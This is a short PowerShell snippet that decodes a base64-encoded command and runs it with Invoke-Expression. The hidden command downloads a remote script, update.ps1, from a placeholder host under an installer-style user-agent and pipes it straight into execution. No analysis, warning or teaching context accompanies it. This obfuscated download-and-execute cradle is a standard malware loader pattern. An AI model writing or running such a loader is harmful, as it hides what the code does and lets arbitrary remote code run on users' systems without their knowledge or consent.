$wire = "aXJtIC1VcmkgImh0dHBzOi8vZG93bmxvYWRzLmV4YW1wbGUuaW52YWxpZC91cGRhdGUucHMxIiAtVXNlckFnZW50ICJFeGFtcGxlSW5zdGFsbGVyLzEuMCIgfCBpZXg="
$source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wire))
Invoke-Expression $source
